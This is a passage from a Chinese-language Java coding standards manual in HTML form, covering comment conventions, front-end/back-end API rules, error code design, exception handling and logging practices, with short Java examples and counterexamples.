<p><font color=" #C00000">【强制】</font>所有的抽象方法（包括接口中的方法）必须要用 Javadoc 注释、除了返回值、参数、 异常说明外，还必须指出该方法做什么事情，实现什么功能。</p>
<p><font color=" #977C00">说明：</font>对子类的实现要求，或者调用注意事项，请一并说明。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有的类都必须添加创建者和创建日期。</p>
<p><font color=" #977C00">说明：</font>在设置模板时，注意 IDEA的@author 为<code>${USER}</code>，而 eclipse 的@author 为<code>${user}</code> ，大小写有 区别，而日期的设置统一为 yyyy/MM/dd 的格式。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * @author yangguanbao
 * @date 2016/10/31
 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>方法内部单行注释，在被注释语句上方另起一行，使用//注释。方法内部多行注释使 用/* */注释，注意与代码对齐。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有的枚举类型字段必须要有注释，说明每个数据项的用途。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>与其“半吊子”英文来注释，不如用中文注释把问题说清楚。专有名词与关键字保持 英文原文即可。</p>
<p><font color=" #FF4500">反例：</font>“TCP 连接超时”解释成“传输控制协议连接超时”，理解反而费脑筋。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>代码修改的同时，注释也要进行相应的修改，尤其是参数、返回值、异常、核心逻辑 等的修改。</p>
<p><font color=" #977C00">说明：</font>代码与注释更新不同步，就像路网与导航软件更新不同步一样，如果导航软件严重滞后，就失去了导航的意义。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>在类中删除未使用的任何字段、方法、内部类；在方法中删除未使用的任何参数声明 与内部变量。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>谨慎注释掉代码。在上方详细说明，而不是简单地注释掉。如果无用，则删除。</p>
<p><font color=" #977C00">说明：</font>代码被注释掉有两种可能性：</p>
<p>1）后续会恢复此段代码逻辑。</p>
<p>2）永久不用</p>
<p>前者如果没有备注信息， 难以知晓注释动机。后者建议直接删掉即可，假如需要查阅历史代码，登录代码仓库即可。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>对于注释的要求</p>
<ul>
<li>
<p>第一、能够准确反映设计思想和代码逻辑</p>
</li>
<li>
<p>第二、能够描述业务含 义，使别的程序员能够迅速了解到代码背后的信息</p>
</li>
</ul>
<p>完全没有注释的大段代码对于阅读者形同 天书，注释是给自己看的，即使隔很长时间，也能清晰理解当时的思路；注释也是给继任者看的，使其能够快速接替自己的工作。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>好的命名、代码结构是自解释的，注释力求精简准确、表达到位。避免出现注释的一 个极端：过多过滥的注释，代码的逻辑一旦修改，修改注释又是相当大的负担。</p>
<p><font color=" #FF4500">反例：</font></p>
<p>// put elephant into fridge put(elephant, fridge);</p>
<p>方法名 put，加上两个有意义的变量名 elephant 和 fridge，已经说明了这是在干什么，语义清晰的代码不 需要额外的注释。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>特殊注释标记，请注明标记人与标记时间。注意及时处理这些标记，通过标记扫描， 经常清理此类标记。线上故障有时候就是来源于这些标记处的代码。</p>
<p>1）  待办事宜（<font color="#0000FF">TODO</font>）:（标记人，标记时间，[预计处理时间]）</p>
<p>表示需要实现，但目前还未实现的功能。这实际上是一个 Javadoc 的标签，目前的 Javadoc 还没 有实现，但已经被广泛使用。只能应用于类，接口和方法（因为它是一个 Javadoc 标签）。</p>
<p>2）  错误，不能工作（<font color="#0000FF">FIXME</font>）:（标记人，标记时间，[预计处理时间]）</p>
<p>在注释中用 FIXME标记某代码是错误的，而且不能工作，需要及时纠正的情况。</p>
</li>
</ol>
<h2 id="十-前后端规约">(十)  前后端规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>前后端交互的 API，需要明确协议、域名、路径、请求方法、请求内容、状态码、响 应体。</p>
<p><font color=" #977C00">说明：</font></p>
<p>1）  <strong>协议</strong>：生产环境必须使用 HTTPS。</p>
<p>2）  <strong>路径</strong>：每一个 API 需对应一个路径，表示 API 具体的请求地址：</p>
<ul>
<li>
<p>代表一种资源，只能为名词，推荐使用复数，不能为动词，请求方法已经表达动作意义。</p>
</li>
<li>
<p>URL路径不能使用大写，单词如果需要分隔，统一使用下划线。</p>
</li>
<li>
<p>路径禁止携带表示请求内容类型的后缀，比如".json",“.xml”，通过 accept 头表达即可。</p>
</li>
</ul>
<p>3）  <strong>请求方法</strong>：对具体操作的定义，常见的请求方法如下：</p>
<ul>
<li>
<p>GET：从服务器取出资源。</p>
</li>
<li>
<p>POST：在服务器新建一个资源。</p>
</li>
<li>
<p>PUT：在服务器更新资源。</p>
</li>
<li>
<p>DELETE：从服务器删除资源。</p>
</li>
</ul>
<p>4）  <strong>请求内容</strong>：URL带的参数必须无敏感信息或符合安全要求；body 里带参数时必须设置 Content-Type。 5）  响应体：响应体 body 可放置多种数据类型，由 Content-Type 头来确定。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>前后端数据列表相关的接口返回，如果为空，则返回空数组[]或空集合{}。</p>
<p><font color=" #977C00">说明：</font>此条约定有利于数据层面上的协作更加高效，减少前端很多琐碎的 null 判断。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>服务端发生错误时，返回给前端的响应信息必须包含 ==HTTP 状态码，errorCode、 errorMessage、用户提示信息==四个部分。</p>
<p><font color=" #977C00">说明：</font>四个部分的涉众对象分别是浏览器、前端开发、错误排查人员、用户。</p>
<p>其中输出给用户的提示信息要求：简短清晰、提示友好，引导用户进行下一步操作或解释错误原因，提示信息可以包括错误原因、上 下文环境、推荐操作等。</p>
<p>errorCode：参考<a href="#%E9%99%84%E5%BD%952%EF%BC%9A%E9%94%99%E8%AF%AF%E7%A0%81%E5%88%97%E8%A1%A8"><strong>附录2：错误码列表</strong></a>。</p>
<p>errorMessage：简要描述后端出错原因，便于错误排 查人员快速定位问题，注意不要包含敏感数据信息。</p>
<p><font color="#019858">正例：</font>常见的 HTTP 状态码如下</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>信息</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>200</td>
<td>OK</td>
<td>表明该请求被成功地完成，所请求的资源发送到客户端。</td>
</tr>
<tr>
<td>401</td>
<td>Unauthorized</td>
<td>请求要求身份验证，常见对于需要登录而用户未登录的情况。</td>
</tr>
<tr>
<td>403</td>
<td>Forbidden</td>
<td>服务器拒绝请求，常见于机密信息或复制其它登录用户链接访问服务器的情况。</td>
</tr>
<tr>
<td>404</td>
<td>Not Found</td>
<td>服务器无法取得所请求的网页，请求资源不存在。</td>
</tr>
<tr>
<td>500</td>
<td>Internal Server Error</td>
<td>服务器内部错误。</td>
</tr>
</tbody>
</table>
</li>
<li>
<p><font color=" #C00000">【强制】</font>==在前后端交互的 JSON 格式数据中，所有的 key 必须为小写字母开始的 lowerCamelCase 风格==，符合英文表达习惯，且表意完整。</p>
<p><font color="#019858">正例：</font>errorCode / errorMessage / assetStatus / menuList / orderList / configFlag</p>
<p><font color=" #FF4500">反例：</font>ERRORCODE / ERROR_CODE / error_message / error-message / errormessage / ErrorMessage / msg</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>errorMessage 是前后端错误追踪机制的体现，可以在前端输出到 type=“hidden” 文字类控件中，或者用户端的日志中，帮助我们快速地定位出问题。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>对于需要使用超大整数的场景，服务端一律使用 String 字符串类型返回，禁止使用 Long 类型。</p>
<p><font color=" #977C00">说明：</font>Java 服务端如果直接返回 Long 整型数据给前端，JS 会自动转换为 Number 类型（注：此类型为双精度浮点数，表示原理与取值范围等同于 Java 中的 Double）。Long 类型能表示的最大值是 2 的 63 次方 -1，在取值范围之内，超过 2 的 53 次方 (9007199254740992)的数值转化为 JS 的 Number 时，有些数值会有精度损失。</p>
<p>扩展说明，在 Long 取值范围内，任何 2 的指数次整数都是绝对不会存在精度损失的，所 以说精度损失是一个概率问题。若浮点数尾数位与指数位空间不限，则可以精确表示任何整数，但很不幸， 双精度浮点数的尾数位只有 52 位。</p>
<p><font color=" #FF4500">反例：</font>通常在订单号或交易号大于等于 16 位，大概率会出现前后端单据不一致的情况，比如，“orderId”: 362909601374617692，前端拿到的值却是: 362909601374617660。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>HTTP 请求通过 URL传递参数时，不能超过 2048 字节。</p>
<p><font color=" #977C00">说明：</font>不同浏览器对于 URL的最大长度限制略有不同，并且对超出最大长度的处理逻辑也有差异，2048 字节是取所有浏览器的最小值。</p>
<p><font color=" #FF4500">反例：</font>某业务将退货的商品 id 列表放在 URL中作为参数传递，当一次退货商品数量过多时，URL参数超长， 传递到后端的参数被截断，导致部分商品未能正确退货。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>HTTP 请求通过 body 传递内容时，必须控制长度，超出最大长度后，后端解析会出 错。</p>
<p><font color=" #977C00">说明：</font>nginx 默认限制是 1MB，tomcat 默认限制为 2MB，当确实有业务需要传较大内容时，可以通过调大服务器端的限制。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在翻页场景中，用户输入参数的小于 1，则前端返回第一页参数给后端；后端发现用 户输入的参数大于总页数，直接返回最后一页。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>服务器内部重定向必须使用 forward；外部重定向地址必须使用 ==URL统一代理模块== 生成，否则会因线上采用 HTTPS 协议而导致浏览器提示“不安全”，并且还会带来 URL维护 不一致的问题。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>服务器返回信息必须被标记是否可以缓存，如果缓存，客户端可能会重用之前的请求结果。</p>
<p><font color=" #977C00">说明：</font>缓存有利于减少交互次数，减少交互的平均延迟。</p>
<p><font color="#019858">正例：</font>http 1.1 中，s-maxage 告诉服务器进行缓存，时间单位为秒，用法如下， response.setHeader(“Cache-Control”, “s-maxage=” + cacheSeconds);</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>服务端返回的数据，使用 JSON 格式而非 XML。</p>
<p><font color=" #977C00">说明：</font>尽管 HTTP 支持使用不同的输出格式，例如纯文本，JSON，CSV，XML，RSS 甚至 HTML。如果我 们使用的面向用户的服务，应该选择 JSON 作为通信中使用的标准数据交换格式，包括请求和响应。此外， application/JSON 是一种通用的 MIME 类型，具有实用、精简、易读的特点。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>前后端的时间格式统一为"yyyy-MM-dd HH:mm:ss"，统一为 GMT。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>在接口路径中不要加入版本号，版本控制在 HTTP 头信息中体现，有利于向前兼容。</p>
<p><font color=" #977C00">说明：</font>当用户在低版本与高版本之间反复切换工作时，会导致迁移复杂度升高，存在数据错乱风险。</p>
</li>
</ol>
<h2 id="十一-其他">(十一)  其他</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>在使用正则表达式时，利用好其预编译功能，可以有效加快正则匹配速度。</p>
<p><font color=" #977C00">说明：</font>不要在方法体内定义：Pattern pattern = Pattern.compile(“规则”);</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>避免用 Apache Beanutils 进行属性的 copy。</p>
<p><font color=" #977C00">说明：</font>Apache BeanUtils 性能较差，可以使用其他方案比如 Spring BeanUtils, Cglib BeanCopier，注意 均是浅拷贝。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>velocity 调用 POJO 类的属性时，直接使用属性名取值即可，模板引擎会自动按规范 调用 POJO 的 getXxx()，如果是 boolean 基本数据类型变量（boolean 命名不需要加 is 前缀）， 会自动调用 isXxx()方法。</p>
<p><font color=" #977C00">说明：</font>注意如果是 Boolean 包装类对象，优先调用 getXxx()的方法。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>==后台输送给页面的变量必须加$!{var}——中间的感叹号==。</p>
<p><font color=" #977C00">说明：</font>如果 var 等于 null 或者不存在，那么${var}会直接显示在页面上。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>注意  Math.random()  这个方法返回是 double 类型，注意取值的范围  0≤x&lt;1（能够 取到零值，注意除零异常），如果想获取整数类型的随机数，不要将 x 放大 10 的若干倍然后 取整，直接使用 Random 对象的 nextInt 或者 nextLong 方法。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>不要在视图模板中加入任何复杂的逻辑。</p>
<p><font color=" #977C00">说明：</font>根据 MVC 理论，视图的职责是展示，不要抢模型和控制器的活。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>任何数据结构的构造或初始化，都应指定大小，避免数据结构无限增长吃光内存。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>及时清理不再使用的代码段或配置信息。</p>
<p><font color=" #977C00">说明：</font>对于垃圾代码或过时配置，坚决清理干净，避免程序过度臃肿，代码冗余。</p>
<p><font color="#019858">正例：</font>对于暂时被注释掉，后续可能恢复使用的代码片断，在注释代码上方，统一规定使用三个斜杠(///) 来说明注释掉代码的理由。如：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">///  业务方通知活动暂停</span>
    <span class="token comment">// Business business = new Business();</span>
    <span class="token comment">// business.active();</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"it's finished"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h1>二、异常日志</h1>
<h2 id="一-错误码">(一) 错误码</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>错误码的制定原则：快速溯源、沟通标准化。</p>
<p><font color=" #977C00">说明：</font>  错误码想得过于完美和复杂，就像康熙字典中的生僻字一样，用词似乎精准，但是字典不容易随身 携带并且简单易懂。</p>
<p><font color="#019858">正例：</font>错误码回答的问题是谁的错？错在哪？</p>
<p>1）错误码必须能够快速知晓错误来源，可快速判断是谁的问 题。</p>
<p>2）错误码必须能够进行清晰地比对（代码中容易 equals）。</p>
<p>3）错误码有利于团队快速对错误原因达 到一致认知。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>错误码不体现版本号和错误等级信息。</p>
<p><font color=" #977C00">说明：</font>错误码以不断追加的方式进行兼容。错误等级由日志和错误码本身的释义来决定。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>全部正常，但不得不填充错误码时返回五个零：00000。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>错误码为字符串类型，共 5 位，分成两个部分：错误产生来源+四位数字编号。</p>
<p><font color=" #977C00">说明：</font>错误产生来源分为 A/B/C，</p>
<p>A 表示错误来源于用户，比如参数错误，用户安装版本过低，用户支付 超时等问题；</p>
<p>B 表示错误来源于当前系统，往往是业务逻辑出错，或程序健壮性差等问题；</p>
<p>C 表示错误来源 于第三方服务，比如 CDN 服务出错，消息投递超时等问题；</p>
<p>四位数字编号从 0001 到 9999，大类之间的 步长间距预留 100，参考<a href="#%E9%99%84%E5%BD%952%EF%BC%9A%E9%94%99%E8%AF%AF%E7%A0%81%E5%88%97%E8%A1%A8"><strong>附录2：错误码列表</strong></a></p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>编号不与公司业务架构，更不与组织架构挂钩，以先到先得的原则在统一平台上进行， 审批生效，编号即被永久固定。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>错误码使用者避免随意定义新的错误码。</p>
<p><font color=" #977C00">说明：</font>尽可能在原有错误码附表中找到语义相同或者相近的错误码在代码中使用即可。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>错误码不能直接输出给用户作为提示信息使用。</p>
<p><font color=" #977C00">说明：</font>==堆栈（stack_trace）、错误信息(error_message)、错误码（error_code）、提示信息（user_tip）== 是一个有效关联并互相转义的和谐整体，但是请勿互相越俎代庖。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>错误码之外的业务独特信息由 error_message 来承载，而不是让错误码本身涵盖过 多具体业务属性。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>在获取第三方服务错误码时，向上抛出允许本系统转义，由 C 转为 B，并且在错误信 息上带上原有的第三方错误码。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>错误码分为一级宏观错误码、二级宏观错误码、三级宏观错误码。</p>
<p><font color=" #977C00">说明：</font>在无法更加具体确定的错误场景中，可以直接使用一级宏观错误码，分别是：A0001（用户端错误）、B0001（系统执行出错）、C0001（调用第三方服务出错）。</p>
<p><font color="#019858">正例：</font>调用第三方服务出错是一级，中间件错误是二级，消息服务出错是三级。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>错误码的后三位编号与 HTTP 状态码没有任何关系。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>错误码有利于不同文化背景的开发者进行交流与代码协作。</p>
</li>
</ol>
<p><font color=" #977C00">说明：</font>英文单词形式的错误码不利于非英语母语国家（如阿拉伯语、希伯来语、俄罗斯语等）之间的开发 者互相协作。</p>
<ol start="13">
<li>
<p><font color="#76923C">【参考】</font>错误码即人性，感性认知+口口相传，使用纯数字来进行错误码编排不利于感性记忆 和分类。</p>
<p><font color=" #977C00">说明：</font>数字是一个整体，每位数字的地位和含义是相同的。</p>
<p><font color=" #FF4500">反例：</font>一个五位数字 12345，第 1 位是错误等级，第 2 位是错误来源，345 是编号，人的大脑不会主动地 拆开并分辨每位数字的不同含义。</p>
</li>
</ol>
<h2 id="二-异常处理">(二) 异常处理</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>Java  类库中定义的可以通过预检查方式规避的 RuntimeException 异常不应该通过 catch  的方式来处理，比如：NullPointerException，IndexOutOfBoundsException 等等。</p>
<p><font color=" #977C00">说明：</font>无法通过预检查的异常除外，比如，在解析字符串形式的数字时，可能存在数字格式错误，不得不通过 catch NumberFormatException 来实现。</p>
<p><font color="#019858">正例：</font>if (obj != null) {…}</p>
<p><font color=" #FF4500">反例：</font>try { obj.method(); } catch (NullPointerException e) {…}</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>异常捕获后不要用来做流程控制，条件控制。</p>
<p><font color=" #977C00">说明：</font>异常设计的初衷是解决程序运行中的各种意外情况，且异常的处理效率比条件判断方式要低很多。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>catch 时请分清稳定代码和非稳定代码，稳定代码指的是无论如何不会出错的代码。 对于非稳定代码的 catch 尽可能进行区分异常类型，再做对应的异常处理。</p>
<p><font color=" #977C00">说明：</font>对大段代码进行 try-catch，使程序无法根据不同的异常做出正确的应激反应，也不利于定位问题， 这是一种不负责任的表现。</p>
<p><font color="#019858">正例：</font>用户注册的场景中，如果用户输入非法字符，或用户名称已存在，或用户输入密码过于简单，在程序上作出分门别类的判断，并提示给用户。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>==捕获异常是为了处理它，不要捕获了却什么都不处理而抛弃之，如果不想处理它，请将该异常抛给它的调用者。最外层的业务使用者，必须处理异常，将其转化为用户可以理解的内容==。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>事务场景中，抛出异常被 catch 后，如果需要回滚，一定要注意手动回滚事务。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>finally 块必须对资源对象、流对象进行关闭，有异常也要做 try-catch。</p>
<p><font color=" #977C00">说明：</font>如果 JDK7 及以上，可以使用 try-with-resources 方式。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>不要在 finally 块中使用 return。</p>
<p><font color=" #977C00">说明：</font>try 块中的 return 语句执行成功后，并不马上返回，而是继续执行 finally 块中的语句，如果此处存 在 return 语句，则在此直接返回，无情丢弃掉 try 块中的返回点。</p>
<p><font color=" #FF4500">反例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">checkReturn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token comment">// x 等于 1，此处不返回</span>
        <span class="token keyword">return</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
        <span class="token comment">//  返回的结果是 2</span>
        <span class="token keyword">return</span> <span class="token operator">++</span>x<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>捕获异常与抛异常，必须是完全匹配，或者捕获异常是抛异常的父类。</p>
<p><font color=" #977C00">说明：</font>如果预期对方抛的是绣球，实际接到的是铅球，就会产生意外情况。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>==在调用 RPC、二方包、或动态生成类的相关方法时，捕捉异常必须使用 Throwable 类来进行拦截==。</p>
<p><font color=" #977C00">说明：</font>通过反射机制来调用方法，如果找不到方法，抛出 NoSuchMethodException。什么情况会抛出 NoSuchMethodError 呢？二方包在类冲突时，仲裁机制可能导致引入非预期的版本使类的方法签名不匹配， 或者在字节码修改框架（比如：ASM）动态创建或修改类时，修改了相应的方法签名。这些情况，即使代码编译期是正确的，但在代码运行期时，会抛出 NoSuchMethodError。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>方法的返回值可以为 null，不强制返回空集合，或者空对象等，必须添加注释充分说明什么情况下会返回 null 值。</p>
<p><font color=" #977C00">说明：</font>本手册明确防止 NPE 是调用者的责任。即使被调用方法返回空集合或者空对象，对调用者来说，也并非高枕无忧，必须考虑到远程调用失败、序列化失败、运行时异常等场景返回 null 的情况。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>防止 NPE，是程序员的基本修养，注意 NPE 产生的场景：</p>
<p>1）  返回类型为基本数据类型，return 包装数据类型的对象时，自动拆箱有可能产生 NPE。</p>
<p><font color=" #FF4500">反例：</font>public int f() { return Integer 对象}，  如果为 null，自动解箱抛 NPE。</p>
<p>2）  数据库的查询结果可能为 null。</p>
<p>3）  集合里的元素即使 isNotEmpty，取出的数据元素也可能为 null。</p>
<p>4）  远程调用返回对象时，一律要求进行空指针判断，防止 NPE。</p>
<p>5）  对于 Session 中获取的数据，建议进行 NPE 检查，避免空指针。</p>
<p>6）  级联调用 obj.getA().getB().getC()；一连串调用，易产生 NPE。</p>
<p><font color="#019858">正例：</font>使用 JDK8 的 Optional 类来防止 NPE 问题。</p>
</li>
<li>
<p><font color=" #FFC000">【推荐】</font>定义时区分 unchecked / checked  异常，避免直接抛出 new RuntimeException()， 更不允许抛出 Exception 或者 Throwable，应使用有业务含义的自定义异常。推荐业界已定义过的自定义异常，如：DAOException / ServiceException 等。</p>
</li>
<li>
<p><font color="#76923C">【参考】</font>对于公司外的 http/api 开放接口必须使用 errorCode；应用内部推荐异常抛出；跨应用间 RPC 调用优先考虑使用 Result 方式，封装 isSuccess()方法、errorCode、 errorMessage；</p>
<p><font color=" #977C00">说明：</font>关于 RPC 方法返回方式使用 Result 方式的理由：</p>
<p>1）使用抛异常返回方式，调用方如果没有捕获到就会产生运行时错误。</p>
<p>2）如果不加栈信息，只是 new 自定义异常，加入自己的理解的 error message，对于调用端解决问题 的帮助不会太多。如果加了栈信息，在频繁调用出错的情况下，数据序列化和传输的性能损耗也是问题。</p>
</li>
</ol>
<h2 id="三-日志规约">(三) 日志规约</h2>
<ol>
<li>
<p><font color=" #C00000">【强制】</font>应用中不可直接使用日志系统（Log4j、Logback）中的 API，而应依赖使用日志框架（SLF4J、JCL–Jakarta Commons Logging）中的 API，使用门面模式的日志框架，有利于维护和 各个类的日志处理方式统一。</p>
<p><font color=" #977C00">说明：</font>日志框架（SLF4J、JCL–Jakarta Commons Logging）的使用方式（推荐使用 SLF4J）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">使用 <span class="token constant">SLF4J</span>：

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span> 
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span></span><span class="token punctuation">;</span> 
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

使用 <span class="token constant">JCL</span>： 
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">Log</span></span><span class="token punctuation">;</span> 
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">LogFactory</span></span><span class="token punctuation">;</span> 
<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Log</span> log <span class="token operator">=</span> <span class="token class-name">LogFactory</span><span class="token punctuation">.</span><span class="token function">getLog</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>所有日志文件至少保存 15 天，因为有些异常具备以“周”为频次发生的特点。对于当天日志，以<code>应用名.log</code>来保存，保存在/home/admin/应用名/logs/目录下，过往日志 格式为: {logname}.log.{保存日期}，日期格式：yyyy-MM-dd</p>
<p><font color="#019858">正例：</font>以 aap 应用为例，日志保存在/home/admin/aapserver/logs/aap.log，历史日志名称为 aap.log.2016-08-01</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>根据国家法律，网络运行状态、网络安全事件、个人敏感信息操作等相关记录，留存 的日志不少于六个月，并且进行网络多机备份。</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>应用中的扩展日志（如打点、临时监控、访问日志等）命名方式： appName_logType_logName.log。logType:日志类型，如 stats/monitor/access 等；logName:日志描述。这种命名的好处：通过文件名就可知道日志文件属于什么应用，什么类型，什么目的，也有利于归类查找。</p>
<p><font color=" #977C00">说明：</font>推荐对日志进行分类，如将错误日志和业务日志分开存放，便于开发人员查看，也便于通过日志对系统进行及时监控。</p>
<p><font color="#019858">正例：</font>mppserver 应用中单独监控时区转换异常，如：mppserver_monitor_timeZoneConvert.log</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>在日志输出时，字符串变量之间的拼接使用占位符的方式。</p>
<p><font color=" #977C00">说明：</font>因为 String 字符串的拼接会使用 StringBuilder 的 append()方式，有一定的性能损耗。使用占位符仅是替换动作，可以有效提升性能。</p>
<p><font color="#019858">正例：</font>logger.debug(“Processing trade with id: {} and symbol: {}”, id, symbol);</p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>对于 trace/debug/info 级别的日志输出，必须进行日志级别的开关判断。</p>
<p><font color=" #977C00">说明：</font>虽然在 debug(参数)的方法体内第一行代码 isDisabled(Level.DEBUG_INT)为真时（Slf4j 的常见实现 Log4j 和 Logback），就直接 return，但是参数可能会进行字符串拼接运算。此外，如果 debug(getName()) 这种参数内有 getName()方法调用，无谓浪费方法调用的开销。</p>
<p><font color="#019858">正例：</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//  如果判断为真，那么可以输出 trace 和 debug 级别的日志</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isDebugEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    logger<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"Current ID is: {} and name is: {}"</span><span class="token punctuation">,</span> id<span class="token punctuation">,</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><font color=" #C00000">【强制】</font>避免重复打印日志，浪费磁盘空间，务必在日志配置文件中设置 additivity=false。</p>
<p><font color="#019858">正例：</font><logger name="com.taobao.dubbo.config" additivity="false"></logger></p>
</li>
<li>
<p><font color=" #C00000">【强制】</font>生产环境禁止直接使用 System.out  或 System.err  输出日志或使用 e.printStackTrace()打印异常堆栈。</p>
<p><font color=" #977C00">说明：</font>标准日志输出与标准错误输出文件每次 Jboss 重启时才滚动，如果大量输出送往这两个文件，容易 造成文件大小超过操作系统大小限制。</p>
</li>
<li>
